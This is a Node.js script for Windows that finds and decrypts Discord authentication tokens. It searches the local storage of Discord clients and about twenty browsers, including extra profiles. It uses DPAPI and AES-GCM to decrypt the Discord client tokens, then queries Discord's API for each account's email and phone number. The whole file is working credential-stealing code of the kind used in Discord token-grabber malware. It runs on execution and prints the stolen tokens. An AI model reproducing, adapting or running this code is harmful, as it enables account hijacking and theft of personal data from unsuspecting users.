// @ts-check
const fs = require('fs')
const crypto = require('crypto')
const path = require('path')
const fetch = require('node-fetch')
const dpapi = require('win-dpapi')

if (process.platform !== 'win32') throw new Error('This only works on Windows')

const appDataPath = process.env.APPDATA
const localAppDataPath = process.env.localappdata

const appsPaths = {
  'Discord Client': `${appDataPath}\\discord\\Local Storage\\leveldb`,
  'Discord Canary Client': `${appDataPath}\\discordcanary\\Local Storage\\leveldb`,
  'Discord PTB Client': `${appDataPath}\\discordptb\\Local Storage\\leveldb`,
  Opera: `${appDataPath}\\Opera Software\\Opera Stable\\Local Storage\\leveldb`,
  'Opera GX': `${appDataPath}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb`,
  Amigo: `${localAppDataPath}\\Amigo\\User Data\\Local Storage\\leveldb`,
  Torch: `${localAppDataPath}\\Torch\\User Data\\Local Storage\\leveldb`,
  Kometa: `${localAppDataPath}\\Kometa\\User Data\\Local Storage\\leveldb`,
  Orbitum: `${localAppDataPath}\\Orbitum\\User Data\\Local Storage\\leveldb`,
  CentBrowser: `${localAppDataPath}\\CentBrowser\\User Data\\Local Storage\\leveldb`,
  '7Star': `${localAppDataPath}\\7Star\\7Star\\User Data\\Local Storage\\leveldb`,
  Sputnik: `${localAppDataPath}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb`,
  Vivaldi: `${localAppDataPath}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb`,
  'Chrome SxS': `${localAppDataPath}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb`,
  Chrome: `${localAppDataPath}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`,
  'Epic Privacy Browser': `${localAppDataPath}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb`,
  'Microsoft Edge': `${localAppDataPath}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb`,
  Uran: `${localAppDataPath}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb`,
  Yandex: `${localAppDataPath}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb`,
  Brave: `${localAppDataPath}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb`,
  Iridium: `${localAppDataPath}\\Iridium\\User Data\\Default\\Local Storage\\leveldb`,
  'Ungoogled Chromium': `${localAppDataPath}\\Chromium\\User Data\\Default\\Local Storage\\leveldb`
  // 'Firefox': `${roaming}\\Mozilla\\Firefox\\Profiles`
}

/**
 * Extract Discord tokens from Discord clients (+ decrypt) and browsers
 * @returns {Promise<string[]>}
 */
async function extractDiscordTokens() {
  const tokens = new Set()

  let pathsToCheck = Object.entries(appsPaths)

  // Try to find non-default browser profiles
  pathsToCheck
    .filter(([appName, appPath]) => appPath.includes('Default') && fs.existsSync(appPath.replace(/\\Default.*/, '')))
    .forEach(([appName, appPath]) => {
      fs.readdirSync(appPath.replace(/\\Default.*/, ''))
        .filter(file => file.startsWith('Profile '))
        .forEach(file => {
          const profilePath = appPath.replace('Default', file)
          if (fs.existsSync(profilePath)) pathsToCheck.push([`${appName} ${file}`, profilePath])
        })
    })

  for (const [appName, appPath] of pathsToCheck) {
    if (!fs.existsSync(appPath)) {
      console.log(`Skip ${appName} (not found) - ${appPath}`)
      continue
    }

    console.log(`Look in ${appName} - ${appPath}`)
    const files = await fs.promises.readdir(appPath)
    await Promise.all(
      files
        .filter(f => f.endsWith('.ldb'))
        .map(async file => {
          const content = await fs.promises.readFile(path.join(appPath, file), 'utf8')
          if (appName.toLowerCase().includes('discord')) {
            // Discord clients
            const decryptionKey = await getDiscordDecryptionKey(appPath)
            ;[...content.matchAll(/\"(dQw4w9WgXcQ:.*?)\"/g)]
              .filter(x => x.length >= 2)
              .map(x => x[1])
              .map(encrypted => decryptDiscordToken(encrypted, decryptionKey))
              .forEach(token => {
                console.log(`  Found token ${token}`)
                tokens.add(token)
              })
          } else if (appName.toLowerCase().includes('firefox')) {
            // Firefox
            // TODO: Support Firefox
          } else {
            // Browsers
            ;[...content.matchAll(/([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})/g)]
              .filter(x => x.length >= 2)
              .map(x => x[1])
              .forEach(token => {
                console.log(`  Found token ${token}`)
                tokens.add(token)
              })
          }
        })
    )
  }
  return [...tokens]
}

/**
 * Find the token decryption key in the specified Discord client
 * @param {string} clientPath Discord client path
 * @returns {Promise<string>} Token decryption key for this client
 */
async function getDiscordDecryptionKey(clientPath) {
  const localStatePath = clientPath.replace(/Local Storage.*/, 'Local State')
  const localState = JSON.parse(await fs.promises.readFile(localStatePath, 'utf8')).os_crypt.encrypted_key
  const encryptedKey = Buffer.from(localState, 'base64').slice(5)
  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser')
  return key
}

/**
 *
 * @param {string} token
 * @param {string} decryptionKey
 * @returns {string} Decrypted token
 */
function decryptDiscordToken(token, decryptionKey) {
  token = token.split('dQw4w9WgXcQ:')[1]
  token = Buffer.from(token, 'base64')
  const nonce = token.slice(3, 15)
  const encryptedValue = token.slice(15, token.length - 16)
  const tag = token.slice(token.length - 16, token.length)
  const decipher = crypto.createDecipheriv('aes-256-gcm', decryptionKey, nonce)
  decipher.setAuthTag(tag)
  token = decipher.update(encryptedValue, 'base64', 'utf-8')
  token += decipher.final('utf-8')
  return token
}

async function getUserData(token) {
  const res = await fetch(`https://discordapp.com/api/v9/users/@me`, {
    headers: {
      Authorization: token,
      'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36'
    }
  })
  if (!res.ok) throw new Error('Invalid Discord token')
  return res.json()
}

/**
 * @typedef DiscordUser
 * @type {object}
 * @property {string} id the user's id	identify
 * @property {string} username the user's username, not unique across the platform	identify
 * @property {string} discriminator the user's 4-digit discord-tag	identify
 * @property {string} avatar 	the user's avatar hash	identify
 * @property {?boolean} bot whether the user belongs to an OAuth2 application	identify
 * @property {?boolean} system whether the user is an Official Discord System user (part of the urgent message system)	identify
 * @property {?boolean} mfa_enabled whether the user has two factor enabled on their account	identify
 * @property {?string} banner  	the user's banner hash	identify
 * @property {?number} accent_color  	the user's banner color encoded as an number representation of hexadecimal color code	identify
 * @property {?string} locale the user's chosen language option	identify
 * @property {?boolean} verified whether the email on this account has been verified	email
 * @property {?string} email 	the user's email	email
 * @property {?number} flags the flags on a user's account	identify
 * @property {?number} premium_type the type of Nitro subscription on a user's account	identify
 * @property {?number} public_flags the public flags on a user's account	identify
 */

/**
 * Extract Discord tokens from Discord clients (+ decrypt) and browsers and load associated user data
 * @returns {Promise<{ [token: string]: DiscordUser }>}
 */
const run = async () => {
  const tokens = await extractDiscordTokens()
  const output = /** @type {Awaited<ReturnType<typeof run>>} */ ({})
  console.log('\nCheck Discord tokens using the API')
  for (const token of tokens) {
    console.log(`  Checking token ${token}`)
    const userData = await getUserData(token).catch(() => {})
    if (userData) {
      console.log(
        `  Found user ${userData.username}#${userData.discriminator} (id=${userData.id}, email=${userData.email}, phone=${userData.phone})`
      )
      output[token] = userData
    } else console.log(`  Token is invalid or expired`)
  }
  return output
}

module.exports = { run }

run().then(console.log)
